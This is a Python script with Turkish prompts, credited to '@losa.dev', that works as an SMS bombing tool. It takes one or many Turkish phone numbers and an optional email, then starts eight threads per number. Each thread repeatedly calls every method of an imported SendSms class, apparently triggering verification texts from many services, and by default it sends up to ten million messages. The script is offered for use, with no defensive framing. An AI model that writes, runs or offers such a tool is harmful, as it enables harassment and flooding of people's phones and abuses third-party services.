from colorama import Fore, Style, Back
from time import sleep
from os import system
from sms import SendSms
import threading



servisler_sms = []
            
while 1:
    system("cls||clear")
    print("""{}
                            ...........                               
                    ..:^~!77??????????77!~^:.                         
                 .^~7?JJJYYYYYYYYYYYYJYJJYYJ?!^.                      
              .^~7J55YJYYYYYYYYYYYYYYYYY5YJJYYY?!:.                   
            .^!?JPG5YYYYYYY5JJJYYYYYYJ?J5GPYJ?JYYJ!^                  
          .^!?J5G5?JYPJJ5Y?57^???5YYYJ~!7JPGY7!7J55J!.                
         ^~7??5YJ~~?PG7JPJ?PJ7JYJG5YY557JYY5G5?J55555?:               
       .~~7J7YY?J7JYG5Y55YYP55YYYPG5YYGPYYYY5G5YY5PPPPY:.~^           
      .~~!?JY5YY5YYY?YYPP5YP55YY55Y?P55BG5P5YPGYYYPBPGGGYYJ~          
     .^~~7JJ5YY5YY5?7P5GG5Y5PPYY55Y.:JYYP55PYYPPYY5PGPP5JJY7          
     :~~~JJ55Y5G555::5YY5PYY5P5Y5PY.  ^JY?75P5YPYY5P5GGGYJY7          
     ~!^?J5PPY5BYYJ  JY?~G5YYPPY5G5.  .:?PJ~?5555Y5PY5GB5JY7          
    .~?75JPPGY5B5Y7 .~PY:YGYYYP5YG5:?JYPGPY?Y5PPPYPPYYP5J?J7                      Başlatılıyor...
    :!!!JJP5BYYGPY??5?P#55#BYYYG5PJ~~.P&BYP! ^#J5PGY5Y5Y:?77          
    ~^:^^YG5BGY5YB&7.7##PY~?YYYY5?:  :G#&#GB .! JG5YY5Y5 :7!          
    !^ ~.:PBPBG5PPB. #&&&BP.:~?5!.    :~!~^~   .YP5Y5GY5. :7.         
    :: .~ .YPGGGGP:. :?!?^~    .      .:..:... ^PGYY5PYP:  :Y.        
     :   :  ?BY5GBY   ::...           ........:YBPYYGG5Y^   .?J~.     
            !BPJGPB!.........         .......:Y#PY5G#GPY~     :5BPY!^.
            ^5#YYPGP^........   .....    ...:!5P5GBB#BG5!:      ?BG!.^
            ~?BGYYPGB?. ...   .~~^^^^       :5GGBBBGBGGPJ~       5#7  
           .~5BBGP5P#BJ^.     .::....    .^JG#GGBBBGBPYGP?~      ??   
          .!?GGGGGBBBBBBPY7^..        ..~GBBGBGGB#GGBGJYP5Y!          
          !JGPYGGGBBBGGGBBBBGGY!^...^~^ ^BBBGBGGB#GGG#PJY5YYJ:        
        .75P5YBBGGB#BGGBBGBBBBB?!!~~^.  .G55GB#GG#BGGB#PYYYYY5J:.     
      .^7Y5YYBBB#BB#BBBJYBP5J7J~.::.     ^?7!!YGB#BGGBYPPYY55YPP?~:.  
     :^!55JYGBBP~B#BBBG^::.:J?~           .!^  .^YBGB#^.PG5YPPY5?J7~^.                                        
    by @losa.dev """.format(Fore.LIGHTRED_EX))
    sleep(3)
    system("cls||clear")
    print(Style.RESET_ALL +Fore.LIGHTRED_EX + Back.LIGHTYELLOW_EX + "\nİpucu: Birden fazla girmek için ENTER tuşunu kullanın.")
    print(Style.RESET_ALL + "+90 ile başlayan telefon numarası giriniz: ",end="")
    telefon_no = input()
    tel_no = telefon_no.replace("+90", "").replace(" ", "")
    tel_liste = []
    if tel_no == "":
        print(Style.RESET_ALL + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: ",end="")
        dizin = input()
        try:
            with open(dizin, "r", encoding="utf-8") as f:
                for i in f.read().strip().split("\n"):
                    if len(i) == 10:
                        tel_liste.append(i)
            sonsuz = ""
        except FileNotFoundError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
            sleep(3)
            continue
    else:
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
            tel_liste.append(tel_no)
            sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
            sleep(3)
            continue
    try:
        print(Style.RESET_ALL +Fore.LIGHTRED_EX + Back.LIGHTYELLOW_EX + "\nİpucu: Bilmiyorsanız ENTER tuşunu kullanın.")
        print(Style.RESET_ALL + "Mail adresi giriniz: ",end="")
        mail = input()
        if ("@" not in mail or ".com" not in mail) and mail != "":
            raise
    except:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
        sleep(3)
        continue
    system("cls||clear")
    try:
        print(Style.RESET_ALL +Fore.LIGHTRED_EX + Back.LIGHTYELLOW_EX + "\nİpucu: Sonsuz ise ENTER tuşunu kullanın.")
        print(Style.RESET_ALL + f"Kaç adet SMS göndermek istiyorsun: ",end="")
        kere = input()
        if kere:
            kere = int(kere)
        else:
            kere = None
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
        sleep(3)
        continue
    system("cls||clear")
    if kere is None:
        kere = 10000000
    else:
        continue
    aralik = 0

    def sms_gonder(tel_no, mail, kere, aralik):
        sms = SendSms(tel_no, mail)
        for _ in range(kere):
            for attribute in dir(SendSms):
                attribute_value = getattr(SendSms, attribute)
                if callable(attribute_value):
                    if attribute.startswith('__') == False:
                        if sms.adet == kere:
                            break
                        exec("sms."+attribute+"()")

    threads = []
    for i in tel_liste:
        thread1 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
        thread2 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
        thread3 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
        thread4 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
        thread5 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
        thread6 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
        thread7 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
        thread8 = threading.Thread(target=sms_gonder, args=(i, mail, kere, aralik))
        thread8.start()
        thread7.start()
        thread6.start()
        thread5.start()
        thread4.start()
        thread3.start()
        thread2.start()
        thread1.start()
        for thread in threads:
            thread.join()
        sms = SendSms(i, mail)
        if isinstance(kere, int):
                while sms.adet < kere:
                    for attribute in dir(SendSms):
                        attribute_value = getattr(SendSms, attribute)
                        if callable(attribute_value):
                            if attribute.startswith('__') == False:
                                if sms.adet == kere:
                                    break
                                exec("sms."+attribute+"()")
    print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
    input()